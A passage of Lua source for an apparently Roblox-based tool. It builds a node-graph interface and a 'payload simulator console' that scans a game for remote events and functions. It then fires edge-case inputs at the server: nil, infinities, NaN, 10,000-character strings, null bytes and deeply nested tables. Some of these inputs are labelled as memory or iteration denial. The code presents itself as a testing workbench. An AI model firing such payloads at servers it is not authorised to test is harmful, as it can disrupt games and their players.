    for i, n in ipairs(ITERS) do
        local ibx = 6 + (i-1)*(IB_W+3)
        local iby = curY + 4
        local ib  = mBtn(pf, ibx, iby, IB_W, 18,
            i==1 and Color3.fromRGB(40,55,95) or Color3.fromRGB(20,24,42),
            i==1 and 0.20 or 0.55, 90)
        mC(ib, 4)
        local ilbl = mL(ib,0,0,IB_W,18,"x"..n,
            Enum.Font.GothamBold, 8,
            i==1 and GC.PRI or GC.MID,
            Enum.TextXAlignment.Center, 91)
        mS(ib, i==1 and Color3.fromRGB(110,155,245) or GC.DIV,
            i==1 and 0.40 or 0.70, 1)

        local captN = n
        local captI = i
        local captB = ib
        local captIL= ilbl
        ib.MouseButton1Click:Connect(function()
            -- Deactivate others
            for j, entry in ipairs(iterBtns) do
                TweenService:Create(entry.btn,TweenInfo.new(0.08),{
                    BackgroundColor3=Color3.fromRGB(20,24,42),
                    BackgroundTransparency=0.55}):Play()
                entry.lbl.TextColor3=GC.MID
                local sk=entry.btn:FindFirstChildOfClass("UIStroke")
                if sk then sk.Color=GC.DIV sk.Transparency=0.70 end
            end
            -- Activate this
            selIter = captN
            TweenService:Create(captB,TweenInfo.new(0.08),{
                BackgroundColor3=Color3.fromRGB(40,55,95),
                BackgroundTransparency=0.20}):Play()
            captIL.TextColor3=GC.PRI
            local sk=captB:FindFirstChildOfClass("UIStroke")
            if sk then sk.Color=Color3.fromRGB(110,155,245) sk.Transparency=0.40 end
        end)

        table.insert(iterBtns, {btn=ib, lbl=ilbl})
    end

    -- FIRE button
    local fireBtn = mBtn(pf, PW-76, curY+4, 68, 18,
        Color3.fromRGB(88,200,128), 0.65, 90)
    mC(fireBtn, 4)
    mS(fireBtn, Color3.fromRGB(88,200,128), 0.40, 1)
    mGlow(fireBtn, Color3.fromRGB(88,200,128), 0.70, 2)
    local fireLbl = mL(fireBtn,0,0,68,18,">  FIRE",
        Enum.Font.GothamBold, 9, Color3.fromRGB(88,200,128),
        Enum.TextXAlignment.Center, 91)

    fireBtn.MouseEnter:Connect(function()
        TweenService:Create(fireBtn,TweenInfo.new(0.08),{BackgroundTransparency=0.30}):Play()
    end)
    fireBtn.MouseLeave:Connect(function()
        TweenService:Create(fireBtn,TweenInfo.new(0.08),{BackgroundTransparency=0.65}):Play()
    end)
    fireBtn.MouseButton1Click:Connect(function()
        -- Refresh target label
        local _, freshInst = resolveTarget()
        targetLbl.Text = "TARGET: " .. (freshInst and freshInst.Name or "none configured")
        -- Pulse
        TweenService:Create(fireBtn,TweenInfo.new(0.08),{BackgroundTransparency=0.05}):Play()
        task.delay(0.12,function()
            TweenService:Create(fireBtn,TweenInfo.new(0.12),{BackgroundTransparency=0.65}):Play()
        end)
        firePayload(selIter, payloadTxtBox, targetLbl)
    end)

    -- Clear log button
    local clrBtn = mBtn(pf, PW-145, curY+4, 40, 18,
        GC.DIV, 0.60, 90)
    mC(clrBtn, 4)
    mL(clrBtn,0,0,40,18,"CLEAR",Enum.Font.Gotham,7,GC.DIM,
        Enum.TextXAlignment.Center,91)
    clrBtn.MouseButton1Click:Connect(function()
        for _, l in ipairs(consoleLogLines) do l:Destroy() end
        consoleLogLines = {}
        if consoleLogScroll then
            consoleLogScroll.CanvasSize = UDim2.fromOffset(0,0)
        end
    end)

    curY = curY + ITER_H + SEP

    -- -- Output log ------------------------------------------------
    mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.55,89).Size=UDim2.new(1,0,0,1)
    mL(pf, 8, curY+2, 60, 10, "OUTPUT",
        Enum.Font.GothamBold, 7, GC.DIM, Enum.TextXAlignment.Left, 90)

    local logScroll = Instance.new("ScrollingFrame")
    logScroll.Name                       = "ConsoleLog"
    logScroll.Size                       = UDim2.fromOffset(PW-4, LOG_H-14)
    logScroll.Position                   = UDim2.fromOffset(2, curY+13)
    logScroll.BackgroundColor3           = Color3.fromRGB(6,7,12)
    logScroll.BackgroundTransparency     = 0.30
    logScroll.BorderSizePixel            = 0
    logScroll.ScrollBarThickness         = 2
    logScroll.ScrollBarImageColor3       = Color3.fromRGB(80,100,160)
    logScroll.ScrollBarImageTransparency = 0.40
    logScroll.CanvasSize                 = UDim2.fromOffset(0,0)
    logScroll.ZIndex                     = 90
    logScroll.Parent                     = pf
    mC(logScroll, 4)
    mS(logScroll, GC.DIV, 0.70, 1)
    consoleLogScroll = logScroll

    appendLog("[i] Console ready. Select a generator and press FIRE.", GC.DIM)
    appendLog("[i] Target resolves from the Remote node in your graph.", GC.DIM)
end


local function buildSourceToSinkPage(page)
    page.ClipsDescendants = true
    graphPage = page  -- store for floating panel parenting

    local TOOLBAR_H = 28

    -- -- Toolbar ----------------------------------------------
    local toolbar = mF(page, 0, 0, 0, TOOLBAR_H, Color3.fromRGB(12,14,22), 0.55, 8)
    toolbar.Size = UDim2.new(1,0,0,TOOLBAR_H)
    mF(toolbar,0,TOOLBAR_H-1,0,1,GC.DIV,0.50,9).Size=UDim2.new(1,0,0,1)

    -- "Add Node" label
    mL(toolbar,8,0,50,TOOLBAR_H,"ADD:",Enum.Font.GothamBold,8,GC.DIM,
        Enum.TextXAlignment.Left,9)

    -- One spawn button per node type
    local bx = 42
    for _, td in ipairs(NODE_TYPES) do
        local acc  = ROLE_ACC[td.role]
        local bw   = math.max(50, #td.label * 7 + 12)
        local spawnBtn = mBtn(toolbar, bx, (TOOLBAR_H-18)/2, bw, 18,
            acc, 0.78, 9)
        mC(spawnBtn, 4)
        mS(spawnBtn, acc, 0.55, 1)
        mL(spawnBtn,0,0,bw,18,td.label,Enum.Font.GothamBold,8,acc,
            Enum.TextXAlignment.Center,10)

        local capturedTd = td
        spawnBtn.MouseEnter:Connect(function()
            TweenService:Create(spawnBtn,TweenInfo.new(0.10),{BackgroundTransparency=0.55}):Play()
        end)
        spawnBtn.MouseLeave:Connect(function()
            TweenService:Create(spawnBtn,TweenInfo.new(0.10),{BackgroundTransparency=0.78}):Play()
        end)
        spawnBtn.MouseButton1Click:Connect(function()
            -- Spawn near centre of current canvas view
            local vx = graphCanvas.CanvasPosition.X + graphCanvas.AbsoluteSize.X/2 - NODE_W/2
            local vy = graphCanvas.CanvasPosition.Y + graphCanvas.AbsoluteSize.Y/2 - NODE_H/2
            -- Offset slightly so multiple spawns don't stack
            vx = vx + (#graphNodes % 4) * (NODE_W + 20) - (NODE_W + 20) * 1.5
            vy = vy + math.floor(#graphNodes / 4) * (NODE_H + 30)
            spawnNode(capturedTd, vx, vy)
        end)
        bx = bx + bw + 4
    end

    -- "Console" button (payload console)
    -- Positioned to the left of everything else
    local consoleBtn = mBtn(toolbar, 0, (TOOLBAR_H-18)/2, 68, 18,
        Color3.fromRGB(40, 180, 180), 0.72, 9)
    consoleBtn.Position = UDim2.new(1,-414,0,(TOOLBAR_H-18)/2)
    mC(consoleBtn, 4)
    mS(consoleBtn, Color3.fromRGB(40,180,180), 0.50, 1)
    mGlow(consoleBtn, Color3.fromRGB(40,180,180), 0.72, 2)
    mL(consoleBtn,0,0,68,18,"CONSOLE",Enum.Font.GothamBold,8,
        Color3.fromRGB(80,210,210),Enum.TextXAlignment.Center,10)
    consoleBtn.MouseEnter:Connect(function()
        TweenService:Create(consoleBtn,TweenInfo.new(0.10),{BackgroundTransparency=0.45}):Play()
    end)
    consoleBtn.MouseLeave:Connect(function()
        TweenService:Create(consoleBtn,TweenInfo.new(0.10),{BackgroundTransparency=0.72}):Play()
    end)
    consoleBtn.MouseButton1Click:Connect(function()
        TweenService:Create(consoleBtn,TweenInfo.new(0.08),{BackgroundTransparency=0.10}):Play()
        task.delay(0.12,function()
            TweenService:Create(consoleBtn,TweenInfo.new(0.12),{BackgroundTransparency=0.72}):Play()
        end)
        showPayloadConsole()
    end)

    -- "Trace" button (dependency path tracer)
    -- AUTO GEN button
    local autoGenBtnH = mBtn(toolbar,0,(TOOLBAR_H-18)/2,70,18,
        Color3.fromRGB(0,210,110),0.82,9)
    autoGenBtnH.Position = UDim2.new(1,-492,0,(TOOLBAR_H-18)/2)
    mC(autoGenBtnH,4) mS(autoGenBtnH,Color3.fromRGB(0,210,110),0.45,1)
    mL(autoGenBtnH,0,0,70,18,"** AUTO GEN",
        Enum.Font.GothamBold,7,Color3.fromRGB(0,210,110),
        Enum.TextXAlignment.Center,10)
    autoGenBtnH.MouseEnter:Connect(function()
        autoGenBtnH.BackgroundColor3=Color3.fromRGB(0,210,110)
        autoGenBtnH.BackgroundTransparency=0.65
    end)
    autoGenBtnH.MouseLeave:Connect(function()
        autoGenBtnH.BackgroundTransparency=0.82
    end)
    autoGenBtnH.MouseButton1Click:Connect(function()
        autoGenBtnH.BackgroundTransparency=0.40
        task.delay(0.12,function() autoGenBtnH.BackgroundTransparency=0.82 end)
        if ssCtx.genPrompt then ssCtx.genPrompt() end
    end)

    local traceBtn = mBtn(toolbar, 0, (TOOLBAR_H-18)/2, 52, 18,
        Color3.fromRGB(150, 110, 255), 0.72, 9)
    traceBtn.Position = UDim2.new(1,-338,0,(TOOLBAR_H-18)/2)
    mC(traceBtn, 4)
    mS(traceBtn, Color3.fromRGB(150,110,255), 0.45, 1)
    mGlow(traceBtn, Color3.fromRGB(150,110,255), 0.72, 2)
    mL(traceBtn,0,0,52,18,"TRACE",Enum.Font.GothamBold,8,
        Color3.fromRGB(190,160,255),Enum.TextXAlignment.Center,10)
    traceBtn.MouseEnter:Connect(function()
        TweenService:Create(traceBtn,TweenInfo.new(0.10),{BackgroundTransparency=0.45}):Play()
    end)
    traceBtn.MouseLeave:Connect(function()
        TweenService:Create(traceBtn,TweenInfo.new(0.10),{BackgroundTransparency=0.72}):Play()
    end)
    traceBtn.MouseButton1Click:Connect(function()
        TweenService:Create(traceBtn,TweenInfo.new(0.08),{BackgroundTransparency=0.10}):Play()
        task.delay(0.12, function()
            TweenService:Create(traceBtn,TweenInfo.new(0.12),{BackgroundTransparency=0.72}):Play()
        end)
        task.spawn(function()
            showScanOverlay("Scanning...")
            runDependencyTrace(
                function(msg)
                    showScanOverlay(msg)
                end,
                function(result)
                    hideScanOverlay()
                    local placed = buildTraceGraph(result)
                    showTraceReport(result, placed)
                end
            )
        end)
    end)

    -- Risk score badge (live, updates via refreshWires -> updateRiskBadge)
    -- Shows current chain risk tier. Click to open detailed breakdown.
    local riskBg = mF(toolbar, 0, (TOOLBAR_H-18)/2, 74, 18,
        Color3.fromRGB(40,10,10), 0.45, 9)
    riskBg.Position = UDim2.new(1,-216,0,(TOOLBAR_H-18)/2)
    mC(riskBg, 4)
    mS(riskBg, GC.ERR, 0.55, 1)

    riskBadgeLbl = mL(riskBg, 0, 0, 74, 18,
        "0  ---",
        Enum.Font.GothamBold, 8, GC.ERR,
        Enum.TextXAlignment.Center, 10)

    -- Make the whole badge a button (click = toggle risk detail panel)
    local riskBtn = mBtn(riskBg, 0, 0, 74, 18, Color3.new(0,0,0), 1, 11)
    riskBtn.MouseEnter:Connect(function()
        TweenService:Create(riskBg,TweenInfo.new(0.10),{BackgroundTransparency=0.20}):Play()
    end)
    riskBtn.MouseLeave:Connect(function()
        TweenService:Create(riskBg,TweenInfo.new(0.10),{BackgroundTransparency=0.45}):Play()
    end)
    riskBtn.MouseButton1Click:Connect(function()
        if riskDetailFrm then
            closeRiskDetail()
        else
            showRiskDetail()
        end
    end)

    -- "Execute" button (to the left of Clear All)
    local execBtn = mBtn(toolbar, 0, (TOOLBAR_H-18)/2, 62, 18, GC.CHK, 0.70, 9)
    execBtn.Position = UDim2.new(1,-134,0,(TOOLBAR_H-18)/2)
    mC(execBtn, 4)
    mS(execBtn, GC.CHK, 0.40, 1)
    mGlow(execBtn, GC.CHK, 0.70, 2)
    mL(execBtn,0,0,62,18,"EXECUTE",Enum.Font.GothamBold,8,GC.CHK,Enum.TextXAlignment.Center,10)
    execBtn.MouseEnter:Connect(function()
        TweenService:Create(execBtn,TweenInfo.new(0.10),{BackgroundTransparency=0.40}):Play()
    end)
    execBtn.MouseLeave:Connect(function()
        TweenService:Create(execBtn,TweenInfo.new(0.10),{BackgroundTransparency=0.70}):Play()
    end)
    execBtn.MouseButton1Click:Connect(function()
        -- Brief visual flash
        TweenService:Create(execBtn,TweenInfo.new(0.08),{BackgroundTransparency=0.10}):Play()
        task.delay(0.12, function()
            TweenService:Create(execBtn,TweenInfo.new(0.12),{BackgroundTransparency=0.70}):Play()
        end)
        task.spawn(executeChain)
    end)

    -- -- Custody Ledger toggle button ------------------------------
    -- Sits between TRACE (right edge W-224) and EXECUTE (left edge W-134).
    -- 90px total space. Button width 54px -> 18px frame gap each side,
    -- which clears the ~5px glow bleed on neighbouring buttons.
    local LEDGER_W, LEDGER_H = 270, 360
    local ledgerPanel, rebuildLedger

    local ledgerBtn = mBtn(toolbar, 0, (TOOLBAR_H-18)/2, 54, 18,
        Color3.fromRGB(80,200,140), 0.74, 9)
    ledgerBtn.Position = UDim2.new(1,-278,0,(TOOLBAR_H-18)/2)
    mC(ledgerBtn, 4)
    mS(ledgerBtn, Color3.fromRGB(80,200,140), 0.45, 1)
    mL(ledgerBtn,0,0,54,18,"LEDGER",Enum.Font.GothamBold,8,
        Color3.fromRGB(120,240,170),Enum.TextXAlignment.Center,10)
    ledgerBtn.MouseEnter:Connect(function()
        TweenService:Create(ledgerBtn,TweenInfo.new(0.10),{BackgroundTransparency=0.45}):Play()
    end)
    ledgerBtn.MouseLeave:Connect(function()
        TweenService:Create(ledgerBtn,TweenInfo.new(0.10),{BackgroundTransparency=0.74}):Play()
    end)
    ledgerBtn.MouseButton1Click:Connect(function()
        TweenService:Create(ledgerBtn,TweenInfo.new(0.08),{BackgroundTransparency=0.20}):Play()
        task.delay(0.12,function()
            TweenService:Create(ledgerBtn,TweenInfo.new(0.12),{BackgroundTransparency=0.74}):Play()
        end)
        if ledgerPanel and ledgerPanel.Parent then
            ledgerPanel.Visible = not ledgerPanel.Visible
        elseif page then
            ledgerPanel, rebuildLedger = CL:buildPanel(
                page,
                page.AbsoluteSize.X > 0
                    and (page.AbsoluteSize.X - LEDGER_W - 14)
                    or 680,
                TOOLBAR_H + 6,
                LEDGER_W, LEDGER_H
            )
            ledgerPanel.ZIndex = 48
        end
    end)

    -- "Clear All" button (right side)
    local clearAll = mBtn(toolbar, 0, (TOOLBAR_H-18)/2, 56, 18, GC.ERR, 0.80, 9)
    clearAll.Position = UDim2.new(1,-64,0,(TOOLBAR_H-18)/2)
    mC(clearAll,4)
    mS(clearAll,GC.ERR,0.60,1)
    mL(clearAll,0,0,56,18,"Clear All",Enum.Font.GothamBold,8,GC.ERR,Enum.TextXAlignment.Center,10)
    clearAll.MouseButton1Click:Connect(function()
        for _, n in ipairs(graphNodes) do n.frame:Destroy() end
        graphNodes = {}
        for _, w in ipairs(graphWires) do w.frame:Destroy() end
        graphWires = {}
        closeCtx()
        selectedNode = nil
        wiringFrom   = nil
    end)

    -- -- Canvas -----------------------------------------------
    graphCanvas = Instance.new("ScrollingFrame")
    graphCanvas.Name                      = "GraphCanvas"
    graphCanvas.Size                      = UDim2.new(1,0,1,-TOOLBAR_H)
    graphCanvas.Position                  = UDim2.fromOffset(0,TOOLBAR_H)
    graphCanvas.BackgroundColor3          = GC.CANVAS
    graphCanvas.BackgroundTransparency    = 0.78   -- transparent: game world shows through
    graphCanvas.BorderSizePixel           = 0
    graphCanvas.ScrollBarThickness        = 3
    graphCanvas.ScrollBarImageColor3      = Color3.fromRGB(60,80,160)
    graphCanvas.ScrollBarImageTransparency= 0.40
    graphCanvas.CanvasSize                = UDim2.fromOffset(1200, 800)
    graphCanvas.ZIndex                    = 8
    graphCanvas.Parent                    = page

    -- Grid dot pattern: faint accent points for a blueprint/HUD feel.
    -- Larger spacing + slightly bigger dots, very high transparency so the
    -- game world remains visible behind the canvas.
    local GRID_STEP = 28
    local GW, GH    = 1200, 800
    for gx = 0, GW, GRID_STEP do
        for gy = 0, GH, GRID_STEP do
            local dot = mF(graphCanvas, gx, gy, 2, 2, GC.GRID, 0.88, 8)
            mC(dot, 1)
        end
    end

    -- Click on canvas background: deselect + cancel wiring + close ctx
    graphCanvas.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
            deselectNode()
            closeCtx()
            if wiringFrom then
                if wiringFrom.outPort then wiringFrom.outPort.BackgroundTransparency=0.0 end
                wiringFrom = nil
            end
        end
    end)

    -- -- Spawn default pipeline as a starting example ---------
    local startX, startY = 30, 80
    local spacing = NODE_W + 50
    local prevNode = nil
    for i, td in ipairs(NODE_TYPES) do
        local node = spawnNode(td, startX + (i-1)*spacing, startY)
        if prevNode then
            local wf = makeWire()
            table.insert(graphWires,{from=prevNode,to=node,frame=wf})
        end
        prevNode = node
    end
    refreshWires()

    -- -- Escape key: cancel wiring / close ctx ----------------
    UserInputService.InputBegan:Connect(function(inp, processed)
        if processed then return end
        if inp.KeyCode == Enum.KeyCode.Escape then
            closeCtx()
            if wiringFrom then
                if wiringFrom.outPort then wiringFrom.outPort.BackgroundTransparency=0.0 end
                wiringFrom = nil
            end
        end
    end)
end



-- --- PAYLOAD SIMULATOR CONSOLE -----------------------------------------------
-- A live testing workbench. Lets the user draft or generate edge-case payloads
-- and fire them through the configured chain, observing real server responses.

-- -- Payload type parser -------------------------------------------------------
-- Converts a string representation into an actual typed Lua/Roblox value.
local function parsePayloadString(s)
    s = s:match("^%s*(.-)%s*$")  -- trim whitespace
    if s == "nil"   then return nil   end
    if s == "true"  then return true  end
    if s == "false" then return false end
    -- math.huge / -math.huge / 0/0
    if s == "math.huge"  then return math.huge  end
    if s == "-math.huge" then return -math.huge end
    if s == "0/0"        then return 0/0        end
    -- numeric
    local n = tonumber(s)
    if n then return n end
    -- Lua expressions: 2^53 etc.
    local n2 = tonumber(s:gsub("%^", "e"):gsub("e(%d+)", function(e)
        return tostring(10^tonumber(e))
    end))
    if n2 then return n2 end
    -- quoted string
    if (s:sub(1,1)=='"' and s:sub(-1)=='"') or
       (s:sub(1,1)=="'" and s:sub(-1)=="'") then
        return s:sub(2,-2)
    end
    -- empty table
    if s == "{}" then return {} end
    -- default: treat as plain string
    return s
end

-- -- Presets: edge-case payload generators ------------------------------------
local PAYLOAD_PRESETS = {
    { label = "nil",      col = Color3.fromRGB(160,160,180),
      desc  = "nil -- tests nil guards on the server",
      display = "nil",
      gen   = function() return nil                          end },
    { label = "empty {}",  col = Color3.fromRGB(140,180,255),
      desc  = "Empty table -- tests empty-input handling",
      display = "{}",
      gen   = function() return {}                           end },
    { label = "inf",        col = Color3.fromRGB(255,200,80),
      desc  = "math.huge -- positive infinity / range overflow",
      display = "math.huge",
      gen   = function() return math.huge                    end },
    { label = "-inf",       col = Color3.fromRGB(255,180,60),
      desc  = "-math.huge -- negative infinity",
      display = "-math.huge",
      gen   = function() return -math.huge                   end },
    { label = "NaN",      col = Color3.fromRGB(200,120,255),
      desc  = "0/0 -> NaN -- arithmetic edge case",
      display = "0/0 (NaN)",
      gen   = function() return 0/0                          end },
    { label = "2^53",     col = Color3.fromRGB(255,160,100),
      desc  = "2^53 -- max safe integer, integer overflow boundary",
      display = "2^53",
      gen   = function() return 2^53                         end },
    { label = "long str", col = Color3.fromRGB(100,220,180),
      desc  = "10,000-char string -- length / memory denial",
      display = "string.rep('A',10000)",
      gen   = function() return string.rep("A", 10000)       end },
    { label = "\\0 bytes", col = Color3.fromRGB(220,120,120),
      desc  = "Null-byte string -- binary injection edge case",
      display = '"\\0\\255\\127"',
      gen   = function() return "\0\255\127"                 end },
    { label = "nested",   col = Color3.fromRGB(130,200,255),
      desc  = "50-level nested table -- depth / stack overflow",
      display = "{{{...50 deep...}}}",
      gen   = function()
                  local t={} local c=t
                  for _=1,50 do c.n={} c=c.n end return t
              end },
    { label = "1k table", col = Color3.fromRGB(180,255,180),
      desc  = "1,000-entry table -- size / iteration denial",
      display = "{[1]=1, ... [1000]=1000}",
      gen   = function()
                  local t={} for i=1,1000 do t[i]=i end return t
              end },
    { label = "true",     col = Color3.fromRGB(88,204,128),
      desc  = "Boolean true",
      display = "true",
      gen   = function() return true                         end },
    { label = "false",    col = Color3.fromRGB(200,80,80),
      desc  = "Boolean false",
      display = "false",
      gen   = function() return false                        end },
}

-- -- Console page builder ------------------------------------------------------
local function buildConsolePage(page)
    page.ClipsDescendants = true

    local PAD      = 8
    local TARGET_H = 30
    local SEP      = 1

    -- State local to this console page
    local consoleEntries   = {}   -- { ts, typ, msg }
    local consoleScroll    = nil
    local consoleHolder    = nil
    local payloadBox       = nil
    local descLbl          = nil
    local targetRemote     = nil   -- live Instance reference
    local targetNameLbl    = nil
    local activePreset     = nil   -- currently selected preset index
    local ROW_H_LOG        = 17
    local isFiring         = false

    -- Log colours
    local LC = {
        INFO    = Color3.fromRGB(130, 145, 185),
        FIRE    = Color3.fromRGB(110, 165, 255),
        OK      = Color3.fromRGB( 88, 204, 128),
        ERR     = Color3.fromRGB(218,  60,  68),
        WARN    = Color3.fromRGB(210, 130,  42),
        RESULT  = Color3.fromRGB(190, 220, 255),
        SEP_LOG = Color3.fromRGB( 48,  56,  90),
    }

    -- addLog: append a line to the console output
    local function addLog(typ, msg)
        local ts   = os.date("%H:%M:%S")
        local entry = { ts=ts, typ=typ, msg=msg }
        table.insert(consoleEntries, entry)

        if not consoleHolder then return end

        local idx  = #consoleEntries
        local lrow = Instance.new("Frame")
        lrow.Size                   = UDim2.new(1, -4, 0, ROW_H_LOG)
        lrow.Position               = UDim2.fromOffset(2, (idx-1)*ROW_H_LOG)
        lrow.BackgroundTransparency = 1
        lrow.BorderSizePixel        = 0
        lrow.ZIndex                 = 9
        lrow.Parent                 = consoleHolder

        -- Timestamp
        local tsLbl = Instance.new("TextLabel")
        tsLbl.Size                = UDim2.fromOffset(52, ROW_H_LOG)
        tsLbl.BackgroundTransparency = 1
        tsLbl.Text                = ts
        tsLbl.Font                = Enum.Font.Code
        tsLbl.TextSize            = 8
        tsLbl.TextColor3          = Color3.fromRGB(70, 82, 120)
        tsLbl.TextXAlignment      = Enum.TextXAlignment.Left
        tsLbl.ZIndex              = 10
        tsLbl.Parent              = lrow

        -- Type badge
        local typeW = 34
        local tbadge = Instance.new("TextLabel")
        tbadge.Size               = UDim2.fromOffset(typeW, ROW_H_LOG)
        tbadge.Position           = UDim2.fromOffset(54, 0)
        tbadge.BackgroundTransparency = 1
        tbadge.Text               = typ
        tbadge.Font               = Enum.Font.GothamBold
        tbadge.TextSize           = 8
        tbadge.TextColor3         = LC[typ] or LC.INFO
        tbadge.TextXAlignment     = Enum.TextXAlignment.Left
        tbadge.ZIndex             = 10
        tbadge.Parent             = lrow

        -- Message
        local msgW = consoleHolder.AbsoluteSize.X - 54 - typeW - 6
        local ml = Instance.new("TextLabel")
        ml.Size               = UDim2.new(1, -(54+typeW+2), 1, 0)
        ml.Position           = UDim2.fromOffset(54+typeW+2, 0)
        ml.BackgroundTransparency = 1
        ml.Text               = msg
        ml.Font               = Enum.Font.Code
        ml.TextSize           = 9
        ml.TextColor3         = LC[typ] or LC.INFO
        ml.TextXAlignment     = Enum.TextXAlignment.Left
        ml.TextYAlignment     = Enum.TextYAlignment.Center
        ml.TextTruncate       = Enum.TextTruncate.AtEnd
        ml.ZIndex             = 10
        ml.Parent             = lrow

        -- Sync scroll canvas
        local totalH = #consoleEntries * ROW_H_LOG
        consoleHolder.Size = UDim2.new(1, -4, 0, totalH)
        if consoleScroll then
            consoleScroll.CanvasSize = UDim2.fromOffset(0, totalH)
            task.defer(function()
                if consoleScroll then
                    consoleScroll.CanvasPosition = Vector2.new(0,
                        math.max(0, totalH - consoleScroll.AbsoluteSize.Y))
                end
            end)
        end
    end

    -- clearLog: wipe all console output
    local function clearLog()
        consoleEntries = {}
        if consoleHolder then
            for _, c in ipairs(consoleHolder:GetChildren()) do c:Destroy() end
            consoleHolder.Size = UDim2.new(1,-4,0,0)
        end
        if consoleScroll then
            consoleScroll.CanvasSize = UDim2.fromOffset(0,0)
        end
    end

    -- getPayloadValue: read from the editor box and parse
    local function getPayloadValue()
        if not payloadBox then return "" end
        local raw = payloadBox.Text
        if raw == "" then return nil end
        return parsePayloadString(raw)
    end

    -- firePayload: send the payload through the target remote
    local function firePayload(payload)
        if isFiring then
            addLog("WARN", "Already firing -- wait for current run to complete.")
            return
        end
        if not targetRemote then
            addLog("ERR", "No target selected. Use SYNC or SCAN to choose a remote.")
            return
        end

        isFiring = true
        local cls = targetRemote.ClassName
        local nm  = targetRemote.Name

        local displayPayload = tostring(payload)
        if type(payload) == "string" and #payload > 40 then
            displayPayload = '"' .. payload:sub(1,37) .. '..."  (' .. #payload .. ' chars)'
        elseif type(payload) == "table" then
            displayPayload = "{table}  (" .. tostring(#payload) .. " entries)"
        elseif payload == nil then
            displayPayload = "nil"
        end

        addLog("FIRE", "-> " .. cls .. "  [" .. nm .. "]  payload: " .. displayPayload)

        local t0 = tick()
        local ok, result = false, nil

        if cls == "RemoteEvent" then
            ok, result = pcall(function()
                targetRemote:FireServer(payload)
                return "FireServer() dispatched"
            end)
        elseif cls == "RemoteFunction" then
            ok, result = pcall(function()
                return targetRemote:InvokeServer(payload)
            end)
        elseif cls == "BindableEvent" then
            ok, result = pcall(function()
                targetRemote:Fire(payload)
                return "Fire() dispatched"
            end)
        elseif cls == "BindableFunction" then
            ok, result = pcall(function()
                return targetRemote:Invoke(payload)
            end)
        else
            ok, result = false, "Unsupported class: " .. cls
        end

        local elapsed = math.floor((tick() - t0) * 1000)

        if ok then
            local resStr = tostring(result)
            if #resStr > 80 then resStr = resStr:sub(1,77) .. "..." end
            addLog("OK",  "Result: " .. resStr .. "  (" .. elapsed .. "ms)")
        else
            local errStr = tostring(result)
            if #errStr > 80 then errStr = errStr:sub(1,77) .. "..." end
            addLog("ERR", "Error: " .. errStr .. "  (" .. elapsed .. "ms)")
        end

        isFiring = false
    end

    -- -- Layout ------------------------------------------------------------
    local W = page.AbsoluteSize.X > 10 and page.AbsoluteSize.X or (panW - CONTENT_PAD*2)
    local H = page.AbsoluteSize.Y > 10 and page.AbsoluteSize.Y or (panH - 120)
    local EDIT_W  = math.floor(W * 0.42)
    local CON_W   = W - EDIT_W - SEP

    -- -- TARGET STRIP ------------------------------------------------------
    local targetStrip = mF(page, 0, 0, 0, TARGET_H,
        Color3.fromRGB(12,14,24), 0.0, 6)
    targetStrip.Size = UDim2.new(1, 0, 0, TARGET_H)
    mF(targetStrip, 0, TARGET_H-1, 0, 1, Color3.fromRGB(40,50,90), 0.50, 7).Size = UDim2.new(1,0,0,1)

    mL(targetStrip, PAD, 0, 44, TARGET_H, "TARGET",
        Enum.Font.GothamBold, 7, Color3.fromRGB(80,95,140),
        Enum.TextXAlignment.Left, 7)

    targetNameLbl = mL(targetStrip, PAD+46, 0, 0, TARGET_H,
        "No target -- click SYNC or SCAN",
        Enum.Font.Gotham, 9, Color3.fromRGB(130,145,185),
        Enum.TextXAlignment.Left, 7)
    targetNameLbl.Size = UDim2.new(1, -(PAD+46+130), 1, 0)

    -- SYNC button: pull from the S->S graph REMOTE node
    local syncBtn = mBtn(targetStrip, 0, (TARGET_H-16)/2, 46, 16,
        Color3.fromRGB(40,70,140), 0.40, 7)
    syncBtn.Position = UDim2.new(1,-130,0,(TARGET_H-16)/2)
    mC(syncBtn, 4)
    mS(syncBtn, Color3.fromRGB(80,120,220), 0.50, 1)
    mL(syncBtn, 0,0,46,16, "SYNC", Enum.Font.GothamBold, 8,
        Color3.fromRGB(140,180,255), Enum.TextXAlignment.Center, 8)
    syncBtn.MouseButton1Click:Connect(function()
        -- Pull target from S->S graph REMOTE node
        for _, n in ipairs(graphNodes) do
            if n.typeData.id == "REMOTE" and n.targetInst then
                targetRemote = n.targetInst
                targetNameLbl.Text      = n.targetInst.ClassName .. ": " .. n.targetInst.Name
                targetNameLbl.TextColor3= Color3.fromRGB(110,165,255)
                addLog("INFO", "Target synced from graph: " .. n.targetInst.ClassName
                    .. " [" .. n.targetInst.Name .. "]")
                return
            end
        end
        addLog("WARN", "No remote configured in S->S graph. Right-click a Remote node to select one.")
    end)

    -- SCAN button: scan for remotes and pick first found
    local scanBtn2 = mBtn(targetStrip, 0, (TARGET_H-16)/2, 44, 16,
        Color3.fromRGB(40,60,100), 0.50, 7)
    scanBtn2.Position = UDim2.new(1,-80,0,(TARGET_H-16)/2)
    mC(scanBtn2, 4)
    mS(scanBtn2, Color3.fromRGB(70,100,180), 0.55, 1)
    mL(scanBtn2, 0,0,44,16, "SCAN", Enum.Font.GothamBold, 8,
        Color3.fromRGB(110,145,210), Enum.TextXAlignment.Center, 8)
    scanBtn2.MouseButton1Click:Connect(function()
        local found = scanRemotes()
        if #found == 0 then
            addLog("WARN", "No RemoteEvents/Functions found in visible game tree.")
            return
        end
        targetRemote = found[1].inst
        targetNameLbl.Text       = found[1].cls .. ": " .. found[1].n
                                   .. "  @  " .. found[1].path
        targetNameLbl.TextColor3 = Color3.fromRGB(110,165,255)
        addLog("INFO", "Scanned -- " .. #found .. " remotes found. Targeting: ["
            .. found[1].n .. "]  (" .. found[1].cls .. ")")
        if #found > 1 then
            addLog("INFO", "Other found: "
                .. table.concat((function()
                       local t={} for i=2,math.min(#found,6) do t[#t+1]=found[i].n end return t
                   end)(), ", "))
        end
    end)

    -- CLR target button
    local clrTgt = mBtn(targetStrip, 0, (TARGET_H-16)/2, 30, 16,
        Color3.fromRGB(80,16,18), 0.55, 7)
    clrTgt.Position = UDim2.new(1,-42,0,(TARGET_H-16)/2)
    mC(clrTgt, 4)
    mL(clrTgt,0,0,30,16,"CLR",Enum.Font.GothamBold,7,
        Color3.fromRGB(200,80,90),Enum.TextXAlignment.Center,8)
    clrTgt.MouseButton1Click:Connect(function()
        targetRemote = nil
        targetNameLbl.Text       = "No target -- click SYNC or SCAN"
